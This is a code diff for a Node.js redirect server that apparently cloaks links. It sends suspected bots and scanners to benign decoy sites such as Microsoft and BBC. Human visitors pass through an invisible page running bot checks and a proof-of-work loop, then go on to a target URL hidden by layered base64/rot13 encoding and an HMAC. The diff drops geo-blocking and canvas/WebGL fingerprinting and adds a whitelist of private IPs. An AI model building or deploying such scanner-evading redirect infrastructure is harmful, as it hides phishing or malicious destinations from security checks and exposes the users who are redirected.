@@ -8,7 +8,9 @@ const fetch = require('node-fetch');
 const app = express();
 app.set('trust proxy', 1);
 
+// ────────────────────────────────────────────────
 // CONFIGURATION
+// ────────────────────────────────────────────────
 const TARGET_URL = process.env.TARGET_URL || 'https://www.google.com';
 const BOT_URLS = [
     'https://www.microsoft.com',
@@ -17,8 +19,6 @@ const BOT_URLS = [
     'https://www.bbc.com',
 ];
 
-const ALLOWED_COUNTRIES = (process.env.ALLOWED_COUNTRIES || '').toUpperCase().split(',').filter(Boolean);
-const BLOCKED_COUNTRIES = (process.env.BLOCKED_COUNTRIES || '').toUpperCase().split(',').filter(Boolean);
 const GEO_API_URL = process.env.GEO_API_URL || 'https://ipinfo.io/{ip}/country';
 
 const LOG_FILE = process.env.LOG_FILE || 'clicks.log';
@@ -32,7 +32,15 @@ const FINAL_SECRET = HMAC_SECRET || crypto.randomBytes(32).toString('hex');
 
 const geoCache = new Map();
 
+// Personal testing whitelist (optional)
+const IP_WHITELIST = [
+    '10.194.140.3', '10.197.137.129', '10.192.104.131',
+    '10.192.86.2', '10.199.38.3', '127.0.0.1', '::1'
+];
+
+// ────────────────────────────────────────────────
 // ENCODERS
+// ────────────────────────────────────────────────
 const encoders = [
     { name: 'base64', enc: s => Buffer.from(s).toString('base64'), dec: s => Buffer.from(s, 'base64').toString() },
     { name: 'rot13', enc: s => s.replace(/[a-zA-Z]/g, c => {
@@ -47,7 +55,9 @@ const encoders = [
     })}
 ];
 
+// ────────────────────────────────────────────────
 // MIDDLEWARE
+// ────────────────────────────────────────────────
 app.use((req, res, next) => {
     res.locals.nonce = crypto.randomBytes(16).toString('hex');
     next();
@@ -68,7 +78,9 @@ app.use(express.urlencoded({ extended: true }));
 
 app.get(['/ping', '/health', '/healthz'], (req, res) => res.send('OK'));
 
+// ────────────────────────────────────────────────
 // HELPERS
+// ────────────────────────────────────────────────
 function isMobile(req) {
     return /android|iphone|ipad|ipod|mobi/i.test(req.headers['user-agent'] || '');
 }
@@ -81,7 +93,12 @@ const strictLimiter = rateLimit({
 
 async function getCountryCode(req) {
     let ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || 'unknown';
-    if (ip === 'unknown' || /^127.|^::1|^10.|^172\.(1[6-9]|2[0-9]|3[0-1])\.|^192\.168\./.test(ip)) return 'XX';
+
+    if (IP_WHITELIST.includes(ip) || 
+        /^10\.|^172\.(1[6-9]|2[0-9]|3[0-1])\.|^192\.168\./.test(ip) ||
+        ip === 'unknown' || ip === '127.0.0.1' || ip === '::1') {
+        return 'LOCAL';
+    }
 
     if (geoCache.has(ip)) {
         const { cc, ts } = geoCache.get(ip);
@@ -96,7 +113,9 @@ async function getCountryCode(req) {
             geoCache.set(ip, { cc, ts: Date.now() });
             return cc || 'XX';
         }
-    } catch (e) {}
+    } catch (e) {
+        console.error('Geo API error:', e.message);
+    }
     return 'XX';
 }
 
@@ -110,18 +129,17 @@ function isLikelyBot(req) {
     return score >= 55;
 }
 
-function logAccess(ip, country, status, reason = '', extra = '') {
+function logAccess(ip, country, status, reason = '') {
     const timestamp = new Date().toISOString();
-    const logEntry = `${timestamp} | ${status} | IP: ${ip} | Country: ${country} | ${reason} | ${extra}\n`;
+    const logEntry = `${timestamp} | ${status} | IP: ${ip} | Country: ${country} | ${reason}\n`;
     
-    // Log to FILE
     fs.appendFile(LOG_FILE, logEntry, () => {});
-    
-    // Log to CONSOLE (what you requested)
-    console.log(`[CLICK] ${status} | ${ip} | ${country} | ${reason} ${extra ? `| ${extra}` : ''}`);
+    console.log(`[CLICK] ${status} | ${ip} | ${country} | ${reason}`);
 }
 
+// ────────────────────────────────────────────────
 // ENCODE / DECODE
+// ────────────────────────────────────────────────
 function multiLayerEncode(str) {
     let result = str;
     const noise = crypto.randomBytes(8).toString('hex');
@@ -159,7 +177,9 @@ function multiLayerDecode(encoded, layers, noise, hmac) {
     return result.slice(16, -16);
 }
 
-// GENERATE ROUTE
+// ────────────────────────────────────────────────
+// ROUTES
+// ────────────────────────────────────────────────
 app.get('/generate', (req, res) => {
     try {
         const target = req.query.target || TARGET_URL;
@@ -179,18 +199,17 @@ app.get('/generate', (req, res) => {
     }
 });
 
-// MAIN INVISIBLE ROUTE WITH CANVAS + WEBGL
 app.get('/r/track', strictLimiter, async (req, res) => {
     const country = await getCountryCode(req);
     const serverBot = isLikelyBot(req);
 
-    if (serverBot || BLOCKED_COUNTRIES.includes(country) || 
-        (ALLOWED_COUNTRIES.length && !ALLOWED_COUNTRIES.includes(country))) {
-        logAccess(req.ip, country, 'BLOCKED', serverBot ? 'SERVER_BOT' : 'GEO');
+    // Only block bots — allow every country
+    if (serverBot) {
+        logAccess(req.ip, country, 'BLOCKED', 'BOT_DETECTED');
         return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
     }
 
-    logAccess(req.ip, country, 'ACCESS', 'SERVER_PASSED');
+    logAccess(req.ip, country, 'ACCESS', 'ALLOWED_WORLDWIDE');
 
     let redirectTarget = TARGET_URL;
 
@@ -210,7 +229,7 @@ app.get('/r/track', strictLimiter, async (req, res) => {
         console.error('Decode error:', e.message);
     }
 
-    // INVISIBLE PAGE WITH ADVANCED FINGERPRINTING
+    // Invisible background check page
     res.send(`
 <!DOCTYPE html>
 <html lang="en">
@@ -225,38 +244,6 @@ app.get('/r/track', strictLimiter, async (req, res) => {
         const TARGET = ${JSON.stringify(redirectTarget)};
         const BOT_URLS = ${JSON.stringify(BOT_URLS)};
 
-        function getCanvasFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                canvas.width = 220;
-                canvas.height = 60;
-                ctx.textBaseline = "alphabetic";
-                ctx.font = "18px Arial";
-                ctx.fillStyle = "#f60";
-                ctx.fillRect(0, 0, 220, 60);
-                ctx.fillStyle = "#069";
-                ctx.fillText("Fingerprint Test", 20, 40);
-                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-                ctx.fillText("🛡️", 150, 35);
-                return canvas.toDataURL();
-            } catch(e) { return "canvas_failed"; }
-        }
-
-        function getWebGLFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return "webgl_not_supported";
-                
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return {
-                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "unknown",
-                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "unknown"
-                };
-            } catch(e) { return "webgl_failed"; }
-        }
-
         function detectBot() {
             const checks = [];
             if (navigator.webdriver) checks.push("webdriver");
@@ -267,7 +254,7 @@ app.get('/r/track', strictLimiter, async (req, res) => {
         }
 
         async function proofOfWork() {
-            const prefix = '0000'; // adjustable
+            const prefix = '0000';
             let nonce = 0;
             const data = 'verify_' + Date.now();
             for (let i = 0; i < 600000; i++) {
@@ -280,28 +267,16 @@ app.get('/r/track', strictLimiter, async (req, res) => {
         }
 
         async function runChecks() {
-            const botChecks = detectBot();
-            const canvasFP = getCanvasFingerprint();
-            const webglFP = getWebGLFingerprint();
-
-            const fingerprintSummary = \`Canvas: ${canvasFP.substring(0, 40)}... | WebGL: ${JSON.stringify(webglFP)}\`;
-
-            if (botChecks.length > 0) {
-                console.warn("[BOT DETECTED CLIENT]", botChecks);
+            if (detectBot().length > 0) {
                 location.href = BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)];
                 return;
             }
-
-            // Run PoW in background
             await proofOfWork();
-
-            // Final redirect
             location.href = TARGET;
         }
 
         runChecks();
 
-        // Safety timeout
         setTimeout(() => {
             location.href = BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)];
         }, 15000);
@@ -311,10 +286,11 @@ app.get('/r/track', strictLimiter, async (req, res) => {
 });
 
 app.use((req, res) => {
-    logAccess(req.ip || 'unknown', 'XX', 'FALLBACK', 'UNKNOWN_ROUTE');
+    logAccess(req.ip || 'unknown', 'XX', 'FALLBACK', `UNKNOWN: ${req.method} ${req.path}`);
     res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
 });
 
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Invisible Redirect Server with Canvas+WebGL running on port ${PORT}`);
+    console.log(`🚀 Worldwide Redirect Server running on port ${PORT}`);
+    console.log(`✅ All countries allowed | Only bots blocked`);
 });
